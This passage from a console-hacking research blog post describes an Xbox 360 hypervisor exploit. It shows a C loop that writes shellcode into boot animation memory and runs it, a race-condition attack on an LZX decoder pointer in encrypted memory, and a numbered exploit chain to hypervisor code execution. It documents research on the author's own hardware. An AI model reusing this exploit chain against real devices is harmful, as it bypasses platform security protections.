					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p></div>
				</td>
						<td><div><p><span>// Loop and load the boot animation until we find the correct whitening bits.</span></p><p><span>DWORD </span><span>count</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></p><p><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Load the boot animation.</span></p><p><span>	</span><span>result</span><span> </span><span>=</span><span> </span><span>XexLoadImage</span><span>(</span><span>"Flash:\\bootanim.xex"</span><span>,</span><span> </span><span>0x40000009</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>&amp;</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>	</span><span>// Get the cipher text for the target address.</span></p><p><span>	</span><span>MemcpyCipherText</span><span>(</span><span>PayloadCipherTextPhysAddr</span><span> </span><span>+</span><span> </span><span>16</span><span>,</span><span> </span><span>codePhysAddr</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>	</span><span>KeFlushCacheRange</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>	</span><span>// Check if the ciphertext in memory matches the oracle ciphertext we generated earlier.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>memcmp</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>pPayloadCipherText</span><span> </span><span>+</span><span> </span><span>16</span><span>,</span><span> </span><span>16</span><span>)</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Overwrite the boot animation code with our shell code ciphertext and flush cache.</span></p><p><span>		</span><span>MemcpyCipherText</span><span>(</span><span>codePhysAddr</span><span>,</span><span> </span><span>PayloadCipherTextPhysAddr</span><span> </span><span>+</span><span> </span><span>0x80</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>0x98030000</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>HvxFlushDCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>codePhysAddr</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>// Call our payload.</span></p><p><span>		</span><span>ULONG</span><span> </span><span>(</span><span>__stdcall</span><span> </span><span>*</span><span>pPayloadFunc</span><span>)</span><span>(</span><span>)</span><span> </span><span>=</span><span> </span><span>(</span><span>ULONG</span><span>(</span><span>__stdcall</span><span>*</span><span>)</span><span>(</span><span>)</span><span>)</span><span>0x98030000</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>pPayloadFunc</span><span>(</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Unload the boot animation.</span></p><p><span>	</span><span>result</span><span> </span><span>=</span><span> </span><span>XexUnloadImage</span><span>(</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>	</span><span>count</span><span>++</span><span>;</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>With everything in place I wrote a small piece of assembly code that would set the console’s ring of light to full orange to know when it executed. I ran the exploit and after 30 seconds to a minute it was able to find a whitening value collision and my assembly code ran. I captured a view of the code from a debugger which you can see here:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b82425&quot;}" data-wp-interactive="core/image"><img decoding="async" width="670" height="539" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/image.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/image.png 670w, https://icode4.coffee/wp-content/uploads/image-300x241.png 300w" sizes="(max-width: 670px) 100vw, 670px"><figcaption>Figure 3: Kernel mode shell code as seen by the debugger</figcaption></figure></div>


<p>Now that I had a way to attack encrypted memory it was time to loop back to the notable XKE payload and see if attacking it was feasible.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">I can now get up to 64kb of arbitrary kernel mode code execution on 360 but still no hv code exec. I'm starting to run out of unhinged attack ideas…</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1832178471881282035?ref_src=twsrc%5Etfw">September 6, 2024</a></blockquote>
</div></figure>



<h2 id="bootloader-update-payload">The Bootloader Update Payload</h2>



<p>This notable XKE payload that I’ll refer to as the “bootloader update payload” is used during system updates when the 2nd stage bootloader (2bl) needs to be updated. The reason this payload is interesting is because it reads in data from kernel mode and performs LZX decompression on it. The decompression process requires a scratch buffer to store the LZX decoder context structure which contains various pointers that the hypervisor will use when decompressing data. This scratch buffer is provided by kernel mode and relocated to <strong>encrypted memory</strong>, which means it doesn’t have any integrity checks and we can attack it from kernel mode asynchronously.</p>



<div id="urvanov-syntax-highlighter-67c61f5b7169c514080037" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p></div>
				</td>
						<td><div><p><span>typedef</span><span> </span><span>struct</span></p><p><span>{</span></p><p><span>	</span><span>/* pointer to beginning of window buffer */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_mem_window</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>/* input (compressed) data pointers */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_input_curpos</span><span>;</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_end_input_pos</span><span>;</span></p><p><span>	</span><span>/* output (uncompressed) data pointer */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_output_buffer</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>/* memory allocation functions */</span></p><p><span>	</span><span>PFNALLOC			</span><span>dec_malloc</span><span>;</span></p><p><span>	</span><span>PFNFREE				</span><span>dec_free</span><span>;</span></p><p><span>	</span><span>long</span><span>*</span><span>				</span><span>dec_memory</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>}</span><span> </span><span>t_decoder_context</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>Looking at the decoder context structure there’s a couple juicy pointers we could try and attack. The <code>dec_malloc</code> and <code>dec_free</code> pointers are function pointers so overwriting these would result in the hypervisor jumping directly to some shell code we control. The <code>dec_output_buffer</code> pointer contains the address where decompressed data should be written to, so overwriting this pointer would result in data being written to any real mode address we choose (such as hypervisor code or data). All we need to do is generate the ciphertext for the address we want to write into the decoder context structure and the hypervisor will gladly use any real mode address we put there, whether it points to protected, encrypted, or unprotected memory. So why would Microsoft store this data in encrypted memory and not protected memory if they knew it could be modified asynchronously by kernel mode?</p>



<h2>Analyzing the Payload</h2>



<p>When the system update process is running and the 2nd stage bootloader needs to be updated, the updater application can have the hypervisor run this XKE payload and it’ll build an updated boot chain for the console in memory. The way this is supposed to work is kernel mode creates one large memory allocation in unprotected memory (around 700-800 KB) that gets divided up into different regions. These regions include a header, update data, decompressed bootloader data, LZX scratch buffer, and a region for the newly updated boot chain.</p>



<p>When the payload starts running it’ll relocate these regions in-place to either encrypted or protected memory depending on the size of the region. The header and compressed update data are relocated to protected memory as both regions are smaller than 64KB, and the decompressed bootloader data, LZX scratch buffer, and updated boot chain are relocated to encrypted memory as each region is too large to fit into a single slot of protected memory (64KB). Technically speaking each region could fit into protected memory if it spanned more than one slot but because a change in slot means a change in the upper 32-bits of a real mode address you’d have to handle this address break in code. You can’t just roll off the end of the 64KB page for slot N and into slot N+1 as even though the memory may be physically contiguous the addresses for each slot are not.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8305f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1144" height="720" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/working_buffer_layout.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/working_buffer_layout.png 1144w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-300x189.png 300w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-768x483.png 768w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-110x70.png 110w" sizes="auto, (max-width: 1144px) 100vw, 1144px"><figcaption>Figure 4: Layout of the working buffer</figcaption></figure></div>


<p>Once the memory is relocated the payload will process the update data which is a compressed, encrypted, RSA signed blob that contains every possible 2nd stage bootloader for all the different hardware revisions of the console. The payload will first verify the RSA signature (that only Microsoft can sign) is valid, then decrypt the data, and then decompress it into the decompressed data region. Next the payload will scan a lookup table in the header of the compressed blob that contains a listing of every bootloader in the blob, what CPU, GPU, and HANA chip they match to, and try to match one of the entries to the console. If a match is found and the blob contains an updated 2nd stage bootloader for the console, the payload will craft a new boot chain and store it in the final region of the data buffer.</p>



<p>The size of the LZX scratch buffer is calculated as <code>sizeof(LZX_DECODER_CTX) + 2 * window_size</code>, where <code>window_size</code> is the block size of data to be compressed. In other words, the input data is processed in blocks of <code>window_size</code> bytes and compressed. To decompress a block you’ll need a buffer of <code>window_size</code> bytes to hold the decompressed data. In the case of this payload the window size chosen was 0x8000 bytes (32KB), thus the size of the scratch buffer is <code>sizeof(LZX_DECODER_CTX) + 0x10000</code> and won’t fit into a single slot of protected memory. Had the window size been slightly smaller the scratch buffer would have been able to fit into protected memory. Fortunately for us this works to our advantage because we can attack the encrypted memory for the scratch buffer using the techniques discussed earlier.</p>



<h2>Attacking LZX: Attempt 1</h2>



<p>In order to attack one of the pointers in the LZX decoder context structure we’ll need the ciphertext for some oracle data to check for a whitening value collision, and the ciphertext for the malicious pointer we want to write into the structure. Using the technique described above the attack would look something like this:</p>



<ol>
<li>Obtain the ciphertext for the oracle data and malicious pointer we want to write. For this attack we’ll target the <code>dec_malloc</code> function pointer in the LZX decoder structure. The pointer should be a real mode address that points to some shell code we setup in unprotected memory.</li>



<li>Create two threads:
<ul>
<li>Thread A will be the payload thread and continuously run the bootloader update payload in a loop.</li>



<li>Thread B will be the attack thread which continuously monitors the input data for the oracle ciphertext. Once the payload relocates the input data to encrypted memory we can observe the ciphertext for it by accessing the memory from kernel mode using the unprotected pathway. Once the ciphertext observed matches our oracle ciphertext we know a whitening value collision was hit and it’s safe to overwrite the LZX decoder structure.</li>
</ul>
</li>



<li>Once a whitening collision is observed, thread B will overwrite the <code>dec_malloc</code> pointer in the LZX decoder structure with the pre-computed ciphertext for our malicious pointer (which points to our shell code).</li>



<li>If we win the race between thread B overwriting the pointer and thread A using the pointer from hypervisor mode, then the hypervisor should jump to our shell code and we’ll get full hypervisor code execution.</li>
</ol>



<p>For the oracle data I chose to use the ciphertext for the first 16 bytes of LZX decoder structure with values of all 00s. When the payload does the in-place relocation of the LZX scratch buffer it’ll zero-initialize it afterwards. By capturing the ciphertext for 16 bytes of 00s at the same address I can use the zero-initialization of the scratch buffer as a start indicator to know when to hammer the decoder structure with the ciphertext for our malicious function pointer. This is the earliest point in time we can detect a whitening value collision and we’re gonna need as much time as we can get to win the race condition.</p>



<h3>Cache Rules Everything Around Me</h3>



<p>Unfortunately attacking the <code>dec_malloc</code> pointer isn’t feasible and the reason is that the CPU L2 cache is just too big for the data containing the decoder structure to age out of cache in the time frame we need. When the XKE payload goes to decompress the input data it’ll call <code>LDICreateDecompression</code> which takes in either two function pointers (one for <code>dec_malloc</code> and one for <code>dec_free</code>) or a pointer to a pre-allocated scratch buffer. In the case of this payload the function pointers are always null and a pointer to the LZX scratch buffer region is provided instead. Regardless of which you provide, the <code>dec_malloc</code> pointer will always be set to the value provided in the function arguments.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b83a6a&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="583" height="724" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1.png 583w, https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1-242x300.png 242w" sizes="auto, (max-width: 583px) 100vw, 583px"><figcaption>Figure 5: Disassembly of dec_malloc being set to NULL</figcaption></figure></div>


<p>Immediately after the <code>dec_malloc</code> function pointer is set to NULL <code>LDICreateDecompression</code> calls <code>sub_2668</code> which will initialize some more of the decoder structure and then try to use the <code>dec_malloc</code> pointer if it’s non-NULL.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8418c&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="768" height="793" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-768x793.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-768x793.png 768w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-290x300.png 290w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-1045x1080.png 1045w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4.png 1055w" sizes="auto, (max-width: 768px) 100vw, 768px"><figcaption>Figure 6: Disassembly of dec_malloc being used</figcaption></figure></div>


<p>This means we need our malicious ciphertext to be committed to memory by thread B before it’s accessed in <code>_dec_mem_alloc</code>, AND we need the cache line containing the <code>dec_malloc</code> pointer to either age out or be evicted from L2 cache of thread A. Unfortunately, there’s less than 300 instructions between these two operations and the L2 cache is too large for the data to age out or be evicted in this time frame. It’s also not possible to attack the <code>dec_free</code> pointer because the decompression routine never calls <code>LDIDestroyDecompression</code> so the <code>dec_free</code> pointer will never be checked and called. There are some additional things I did to try and put pressure on the CPU L2 cache which I’ll dig into in part 3, but as it stands attacking the <code>dec_malloc</code>/<code>dec_free</code> pointers is a no-go.</p>



<h2>Attacking LZX: Attempt 2</h2>



<p>Next attempt was trying to attack the <code>dec_output_buffer</code> pointer. When the decompression routine is run the compressed input buffer is decompressed in blocks. Each block will result in a call to <code>LDIDecompress</code> which decompresses the block and copies the decompressed data to the output buffer specified by the <code>dec_output_buffer</code> pointer. The goal for this attack was to successfully overwrite the <code>dec_output_buffer</code> pointer and get the decompressed data copied an address we specify.</p>



<p>This attempt would work mostly the same as the previous attempt except I’d be hammering the <code>dec_output_buffer</code> pointer to point into the last segment of the hypervisor. This particular area doesn’t contain any important code or data so I can freely trash it and observe the ciphertext for it from kernel mode without impacting stability of the hypervisor. Once the ciphertext changes I’ll know I won the race and got the XKE payload to use my malicious <code>dec_output_buffer</code> pointer to overwrite part of the hypervisor. This attack wouldn’t get me hypervisor code execution directly but instead I’d get a write to an arbitrary real mode address from hypervisor context. I’d need to find a way to turn this write into code execution but first I needed to prove the attack worked and that I wouldn’t be blocked by CPU L2 cache.</p>



<p>Since I was focused on determining if the attack was possible and doing all my testing on a console that was already hacked, I decided to modify the XKE payload and make a slight change that would improve my odds of winning the race condition. Each time the XKE payload runs it’ll use a random whitening value for the in-place memory relocation of the LZX scratch buffer. I modified the payload to instead use a constant value of 0x111. This would allow me to skip checking for a whitening value collision and just hammer the ciphertext for the <code>dec_output_buffer</code> pointer continuously in a loop. If the poc worked and the attack was possible then I could worry about winning the race condition later on.</p>



<p>After deploying the poc and modified XKE payload to my hacked console I let it run and got the debug spew that the race condition had been won. The ciphertext for the last segment of the hypervisor had changed which meant this attack was (most likely) feasible. At the very least I had somewhat of an arbitrary write primitive from hypervisor context and now I needed to find a way to turn it into code execution.</p>



<p>Ignoring that I still needed to win the race condition without my static whitening value patch in place, the write primitive I now have is hardly ideal. Every time the write primitive is triggered it’s going to write 0x8000 bytes of data (the size of the block after being decompressed) that I don’t control the contents of. I made a couple attempts to try and get control of the decompressed data before it gets copied to the <code>dec_output_buffer</code> pointer but had no luck in doing so. In most cases it would cause the console to hang or the <code>LDIDecompress</code> function to fail and return early without copying any data. This was a really crappy write primitive but I knew I’d probably never find another one and this could be the only bug I ever end up finding on the console. I accepted the challenge and decided I <em>had</em> to find a way to make it work.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">When you finally get an arbitrary write primitive that works on hypervisor memory but it always writes 0x8000 bytes of data you can't reliably control the contents of, and now you have to find some unhinged way to make this useful because you know you'll never find another one <a href="https://t.co/IDKIZifzv1">pic.twitter.com/IDKIZifzv1</a></p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1833974721010151669?ref_src=twsrc%5Etfw">September 11, 2024</a></blockquote>
</div></figure>



<h2>Failure Is Not An Option</h2>



<p>The next step is to turn this 0x8000 byte write primitive into something useful. My first train of thought was to use it to perform some memory corruption on other hypervisor data that I could turn into code execution or a more controlled write primitive. I began looking through the data segment of the hypervisor for anything that could be interesting to corrupt such as pointers to other code/data, RSA public keys for code authentication, or internal data structures used by the hypervisor. I found a number of interesting targets and even found some side channels I could use to figure out exactly what data was written to memory. But as I started to conceptualize various attack vectors I quickly realized this wasn’t going to work.</p>



<p>All of the interesting bits of data I was trying to attack were sitting in a minefield of spinlocks the hypervisor uses for acquiring thread safe access to data. My plan of attack depended on specific values within the decompressed data overwriting specific variables in the hypervisor data segment. If I overwrote a spinlock with a non-zero value the hypervisor would never be able to acquire it again, and trying to acquire it would result in that thread getting stuck indefinitely in the spinlock. Some of the spinlocks didn’t matter since they were for functionality that wasn’t important. However, the spinlock that was sitting after all of the interesting data I had found was the spinlock for running XKE payloads. If I overwrote that spinlock I’d never be able to run another XKE payload and I’d basically be locked out from running the write primitive again.</p>



<p>All of the variables I was targeting depended on winning the race condition on a specific block of data. This meant I would need to run the write primitive multiple times until the right block was written, and if I could only run the write primitive once before being locked out then this wasn’t going to work. I tried to find some other variables I could attack with a single write from any decompressed block but I had no such luck in finding any. I spent a few days digging through the data segment over and over but kept coming to the same conclusion: I can’t overwrite anything in the hypervisor data segment that will work to my advantage.</p>



<h3 id="update-data-side-channel">Thinking Outside the Box</h3>



<p>After scoping out several other pieces of hypervisor data in different locations with no success I decided to think outside of the box. The data being decompressed was bootloader code (i.e. valid PPC instructions), so I could in theory execute it if I overwrite some other hypervisor code such as a system call function. But I didn’t have any way to determine which block of decompressed bootloader code was written when I won the race condition. However, side channels come in all shapes and sizes. I realized that all of the decompressed blocks had the same size <em>except</em> for the last block. If I observed the ciphertext for the hypervisor code I overwrite I could determine when I won the race on the last block by seeing that the ciphertext changed for less than 0x8000 bytes. Simply observe at two locations such that the second location is greater than the size of the last block but less than 0x8000.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b84b6d&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1201" height="274" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2.png 1201w, https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2-300x68.png 300w, https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2-768x175.png 768w" sizes="auto, (max-width: 1201px) 100vw, 1201px"><figcaption>Figure 7: How to identify the last block</figcaption></figure></div>


<p>Now that I had a side channel to determine when the last block was written I needed to find some convenient instructions in this block that I could utilize. The idea is to overwrite some hypervisor code such that the first instructions for some hypervisor function get overwritten with some convenient instruction sequence I find in the bootloader data. To make it more complicated the only segment of hypervisor code I could overwrite was the last segment because it’s the only segment that doesn’t contain code for system critical functions which could cause the console to crash if corrupted. Most of this code was for things like IP-TV decryption and DVD drive anti-piracy routines, things that aren’t going to get executed in the background while the system is running.</p>



<p>On top of that only about 12% (or less than 0x2000 bytes) of the last hypervisor segment is code, the rest is just unused. This means any convenient instruction sequence I found in the decompressed bootloader data had to be in the first ~0x2000 bytes or I wouldn’t be able to position it such that it could overwrite the function in the hypervisor segment. The odds weren’t looking good but I began searching through the bootloader code in IDA looking for any instruction sequence I could use. After searching for a bit I found an instruction sequence that was exactly what I was looking for and at an offset that would work:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8529f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="405" height="100" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence.png 405w, https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence-300x74.png 300w" sizes="auto, (max-width: 405px) 100vw, 405px"><figcaption>Figure 8: Convenient instruction sequence</figcaption></figure></div>


<p>This instruction sequence will store the bottom byte of r4 to the memory location pointed to by r6+2 and then return. Simply put these two instructions will act as a fully controlled single byte arbitrary write. As an added bonus it has a low offset which makes placing this instruction sequence over some useless system call function in the last hypervisor segment easy. With this final piece of the puzzle I should now be able to write a full exploit chain to get hypervisor code execution.</p>



<h2>Getting Hypervisor Code Execution</h2>



<p>There are many steps in this exploit chain but the flow will go something like this:</p>



<ol>
<li>Obtain the ciphertext for the oracle data and malicious pointer we want to write over the <code>dec_output_buffer</code> pointer. The malicious pointer will point into the last segment of the hypervisor such that the offset of the stb/blr instruction sequence (0xFA8) in the last block of bootloader data will fall at the start of a system call. I chose <code>HvxFlushUserModeTb</code> because it’s the last system call in the segment.</li>



<li>Create two threads:
<ul>
<li>Thread A will be the XKE payload thread that will continuously run the bootloader update payload in a loop.</li>



<li>Thread B will be the attack thread and continuously monitor the XKE input data for the oracle ciphertext. Once the payload relocates the input data to encrypted memory we can observe the ciphertext for it by using the unprotected pathway. Once the ciphertext observed matches our oracle ciphertext we know a whitening value collision was hit and it’s safe to overwrite the LZX decoder structure.</li>
</ul>
</li>



<li>Once a whitening collision is hit thread B will overwrite the <code>dec_output_buffer</code> pointer in the LZX decoder structure with the ciphertext for our malicious pointer.</li>



<li>We’ll know if the race was won because we can observe the ciphertext for the last segment of the hypervisor and see that it changed after the XKE payload was run. By observing the ciphertext in two locations we can determine if less than 0x8000 bytes of data was written which indicates the last block was written.</li>



<li>Once the race has been won on the last block the instructions for the <code>HvxFlushUserModeTb</code> system call will be replaced with the stb/blr instruction pair. We can now execute this system call from kernel mode and use it as an arbitrary write primitive.</li>



<li>Using the <code>HvxFlushUserModeTb</code> write primitive overwrite an entry in the system call dispatch table to point to an instruction sequence that will get us code execution. For this I chose an instruction sequence that will jump to the address in r4, and overwrote the system call entry for <code>HvxPostOutput</code>.</li>



<li>Set r4 to point to some shell code we create and call <code>HvxPostOutput</code> from kernel mode which will cause the hypervisor to jump to r4 and execute our code. For testing I wrote some assembly code to set the console’s ring of light to full orange and return the value 0x41414141.</li>
</ol>



<p>After coding this up and deploying it to my hacked console I let the exploit run. After a minute or two I got the debug spew that the race had been won on the last block and the exploit ran. I could see the console’s ring of light was lit full orange and the shell code returned 0x41414141 back to kernel mode.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b85bb7&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="412" height="199" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/race_hit_payload_ran.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/race_hit_payload_ran.png 412w, https://icode4.coffee/wp-content/uploads/race_hit_payload_ran-300x145.png 300w" sizes="auto, (max-width: 412px) 100vw, 412px"><figcaption>Figure 9: Debug output from the exploit</figcaption></figure></div>


<p>At this point I should be good to go, just port this over to work on a non-hacked console and we’re done, hypervisor hacked, right? There’s one thing I forgot when running the last few poc’s and that was the patch I made to the XKE payload to use a static whitening value. I kept this patch in to test the poc with the best possible conditions for winning the race, which is why the exploit triggered in 1-2 minutes. Once I remove this patch the payload will use a random whitening value every time it runs. This means not only do we have to wait for a whitening value collision but we also have to win the race condition which we’re going to fail at many times. </p>



<p>After I removed the patch and reran the exploit I wasn’t even getting debug spew that the race condition was being won for any block, even after 30 minutes there was still nothing. It was starting to seem like this attack wasn’t going to work but I wasn’t ready to give up yet.</p>



<h2>Introducing Thread Feng Shui</h2>



<p>To try and get a better idea of what was going on I wrote some code/patches to record timestamps for each thread as the XKE payload was running. This gave me timestamps in microseconds for when the XKE payload relocated the LZX scratch buffer to encrypted memory, when it started to decompress each block of input data, and when the attack thread would start/stop hammering the LZX decoder structure. From the timing data I was able to see that by the time the attack thread was able to observe the whitening value collision the payload thread had already decompressed most of the input data. Which meant that by the time the attack thread got the malicious ciphertext flushed to RAM the XKE payload was already done running.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8630f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="400" height="477" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/cpu_threads.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/cpu_threads.png 400w, https://icode4.coffee/wp-content/uploads/cpu_threads-252x300.png 252w" sizes="auto, (max-width: 400px) 100vw, 400px"><figcaption>Figure 10: Die shot of the Xbox 360 CPU</figcaption></figure></div>


<p>When you create a software thread on the Xbox 360 you can specify which physical hardware thread you want it to run on. I speculated that what hw thread I ran the software threads on actually mattered, and that perhaps the distance to the FSB/L2 cache or inner logic of the L2 crossbar made a difference in how fast the operations completed. To test this I tried a number of different configurations of placing the software threads on different hardware threads and eventually found a configuration that allowed me to win the race condition. I suspected that putting the payload thread as far away from the FSB/L2 cache as possible and the attack thread as close as possible would have had the best results, however, this wasn’t the case.</p>



<p>The configuration with the best results was running the attack thread on hw thread 0 and the payload thread on hw thread 1. It seemed like scheduling them on different CPU cores actually hurt the odds of winning the race condition, and they had to be on the same core. Core 0 also had the best results compared to putting both threads on core 1 or 2. I know basically nothing about how CPUs work at a hardware level, or the inner workings of L1/2 cache and memory transactions. But what I suspect is happening is that each CPU core has its own load/store queues for performing memory transactions. Putting both threads on the same CPU core causes the memory transactions to be queued onto the L2 crossbar together when they would otherwise be queued separately if run on different cores. Put simply, running on the same core batches the loads/stores from both threads when they would otherwise be performed individually, and this significantly reduces the transaction times.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">I never would have thought the physical distance between CPU cores and L2 cache/FSB would make a difference when trying to win a race condition but for the one I'm exploiting it's the difference between non exploitable to exploited. I guess every nanometer counts</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1835754498318606378?ref_src=twsrc%5Etfw">September 16, 2024</a></blockquote>
</div></figure>



<h2>Abusing the CPU for Fun and <s>Profit</s> Cache</h2>



<p>Now that I was able to win the race condition with an unmodified version of the XKE payload I at least knew the attack was theoretically possible. However, the rate at which the race condition was being won was abysmal, and it appeared that the race was only being won during the first half of the decompression process. This meant there was a slim chance of winning the race when the last block was being decompressed. Starting with the race condition success rate I knew this was largely due to how big the L2 cache was. Because the payload thread was more likely to fetch data from cache instead of RAM it meant more missed opportunities for it to fetch my malicious ciphertext from RAM. So if I could find a way to thrash L2 cache the race condition success rate should improve.</p>



